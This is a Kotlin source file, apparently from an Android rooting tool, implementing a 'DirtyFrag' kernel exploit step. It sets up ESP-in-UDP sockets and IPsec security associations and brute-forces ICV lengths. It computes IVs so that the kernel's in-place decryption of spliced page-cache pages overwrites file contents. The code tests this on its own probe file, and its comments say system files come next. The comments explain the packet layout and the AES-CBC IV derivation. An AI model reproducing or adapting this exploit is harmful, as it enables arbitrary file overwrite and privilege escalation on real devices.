package cn.nanoturtle.rootmys9280.manager.rootmy.dirtyfrag

import android.content.Context
import android.util.Log
import java.io.File
import java.security.SecureRandom

/**
 * DirtyFrag 引擎（native 实现）—— 实现阶梯第 3 步：块改写。
 *
 * ## 与原 Kotlin 路线的关系
 *
 * 早先的版本用 Android 的 `IpSecManager` 建 SA、手工拼包发送，结论是**此路不通**：
 * `IpSecManager` 把 SPI / `alg_trunc_len` / 封装端口全部托管且不可回读，
 * 实测只会得到 `XfrmInNoStates`（按 SPI 查不到 SA）与
 * `XfrmInStateProtoError`（SA 找到但 ICV 对不上）。
 * DirtyFrag 需要的是**自己指定 SA 的每一个字段**，因此改走 native（见 cpp/）。
 *
 * ## 报文与 IV
 *
 * ```
 * [ SPI(4) | Seq(4) | IV(16) | 密文(16) | ICV(icv_len) ]
 * ```
 * 密文就是目标文件的**页缓存本身**（由 `splice` 直接挂进 pipe，不落用户态缓冲）。
 * ESP 的 CBC 解密是 `plaintext = AES_DEC(key, C_old) XOR IV`，所以反推
 * `IV = AES_DEC(key, C_old) XOR C_new`，解密结果即为我们想写入的内容。
 *
 * ## 为什么必须自校准 ICV 长度
 *
 * `crypto_authenc_decrypt()` 先验 ICV 再解密，HMAC 输入长度
 * = `assoclen + cryptlen - authsize` = `skb->len - authsize`。对本报文布局
 * `skb->len = 40 + A`，所以 **HMAC 输入恒为 ESP头(8)+IV(16)+密文(16)=40 字节**，
 * 与 authsize 无关；唯一决定成败的是**随包附加的 ICV 字节数 A 必须等于
 * 内核 SA 的实际 authsize**。而 `alg_trunc_len` 是否真落到内核、xfrm 默认截断
 * 多少，跟设备/内核版本有关，不能靠猜 —— 只能逐个候选实测。
 *
 * 候选不中时内核只会静默丢弃（`XfrmInStateProtoError` +1），
 * 对系统没有任何副作用。
 */
object NativeDirtyFrag {

    private const val TAG = "NativeDirtyFrag"

    /** ESP-in-UDP 的标准端口（RFC 3948 NAT-T）。 */
    private const val ENC_PORT = 4500

    /** 发送方端口，需与 SA 的封装端口错开以便内核区分方向。 */
    private const val SENDER_PORT = 4501

    /** 测试用 SPI 基址，每次尝试递增避免与残留 SA 冲突。 */
    private const val SPI_BASE = 0x44460000

    /** ICV 长度候选（字节）与说明，顺序即尝试顺序。 */
    private val ICV_CANDIDATES = listOf(
        16 to "默认截断 128bit（最常见）",
        32 to "未截断 HMAC-SHA256 全 32 字节",
        0 to "完全不附加 ICV",
        12 to "96bit",
        20 to "160bit",
        24 to "192bit",
    )

    data class Result(
        val ok: Boolean,
        val detail: String,
        val log: List<String>,
        /** 校准命中的 ICV 长度；未命中为 -1。 */
        val icvLen: Int = -1,
    )

    /**
     * 验证原语：对一个**自己可读写**的测试文件做一次真实的 16 字节块改写。
     *
     * 这是实现阶梯里的分水岭 —— 它之前全是 app 权限内、失败不伤系统的操作；
     * 它一旦通过，说明「页缓存页确实进了 skb 且被就地解密改写」，
     * 后续才能去动系统文件。
     */
    fun verifyPrimitive(context: Context): Result {
        val log = ArrayList<String>()
        fun step(s: String) {
            Log.i(TAG, s)
            log += s
        }

        DirtyFragNative.probe()?.let { why ->
            return Result(false, "native 调用不可用：$why", log)
        }

        val probe = File(context.filesDir, "dfr-probe.bin")
        val rng = SecureRandom()
        val aesKey = ByteArray(32).also { rng.nextBytes(it) }
        val authKey = ByteArray(32).also { rng.nextBytes(it) }

        var encapFd = -1
        var sendFd = -1
        try {
            // 1) 造一个 64 字节的测试文件（内容固定，便于人眼核对）。
            val orig = ByteArray(64) { (0xA0 + it).toByte() }
            probe.outputStream().use { it.write(orig) }
            step("1. 测试文件已就绪：${probe.absolutePath}（${orig.size} B）")

            // 2) 接收端：绑定 ENC_PORT 并声明 UDP_ENCAP=ESPINUDP。
            encapFd = DirtyFragNative.nativeOpenEncapSocket(ENC_PORT)
            if (encapFd < 0) {
                return Result(false, "开封装 socket 失败 ${DirtyFragNative.describe(encapFd)}", log)
            }
            step("2. 封装 socket 已就绪：fd=$encapFd port=$ENC_PORT")

            // 3) 发送端：绑定 SENDER_PORT 并 connect 到 ENC_PORT。
            sendFd = DirtyFragNative.nativeOpenSenderSocket(SENDER_PORT, ENC_PORT)
            if (sendFd < 0) {
                return Result(false, "开发送 socket 失败 ${DirtyFragNative.describe(sendFd)}", log)
            }
            step("3. 发送 socket 已就绪：fd=$sendFd $SENDER_PORT → $ENC_PORT")

            // 4) 逐个 ICV 长度候选：建 SA → 改写 → 读回比对。
            var spi = SPI_BASE
            var seq = 1
            for ((icvLen, why) in ICV_CANDIDATES) {
                val initRc = DirtyFragNative.nativeInit(aesKey, authKey, icvLen * 8)
                if (initRc != 0) {
                    step("  ICV=$icvLen 初始化失败 ${DirtyFragNative.describe(initRc)}")
                    continue
                }

                spi += 1
                val saRc = DirtyFragNative.nativeSaAdd(spi, ENC_PORT)
                if (saRc != 0) {
                    step("  ICV=$icvLen 建 SA 失败 ${DirtyFragNative.describe(saRc)}")
                    continue
                }

                // 每次复位文件内容，保证 native 侧读到的 C_old 就是 orig。
                probe.outputStream().use { it.write(orig) }
                val desired = ByteArray(16) { (0xC0 + icvLen).toByte() }

                val wrc = DirtyFragNative.nativeWriteBlock16(
                    sendFd, probe.absolutePath, 0L, spi, seq++, desired, icvLen,
                )

                val back = ByteArray(16)
                File(probe.absolutePath).inputStream().use { it.read(back) }

                when {
                    wrc != 0 ->
                        step("  ICV=$icvLen（$why）: 发包失败 ${DirtyFragNative.describe(wrc)}")
                    back.contentEquals(desired) -> {
                        step("  ICV=$icvLen（$why）: ✔ 命中 —— 测试文件已被改写")
                        step("★ 原语可用：页缓存确实进了 skb 并被就地解密")
                        DirtyFragNative.nativeSaDel(spi)
                        return Result(true, "块改写成功（ICV=$icvLen 字节）", log, icvLen)
                    }
                    back.contentEquals(orig) ->
                        step("  ICV=$icvLen（$why）: 未命中（包被内核丢弃，文件未变）")
                    else ->
                        step(
                            "  ICV=$icvLen（$why）: 文件变了但内容不符 -> " +
                                back.take(4).joinToString("") { "%02x".format(it) }
                        )
                }
                DirtyFragNative.nativeSaDel(spi)
            }

            step("✗ 所有 ICV 候选均未命中：该内核对 DirtyFrag 原语不可达")
            return Result(false, "原语不可达（全部 ICV 候选未命中）", log)
        } catch (t: Throwable) {
            step("✗ 异常：${t.javaClass.simpleName}: ${t.message}")
            return Result(false, "${t.javaClass.simpleName}: ${t.message}", log)
        } finally {
            runCatching { if (encapFd >= 0) DirtyFragNative.nativeClose(encapFd) }
            runCatching { if (sendFd >= 0) DirtyFragNative.nativeClose(sendFd) }
            runCatching { probe.delete() }
        }
    }
}
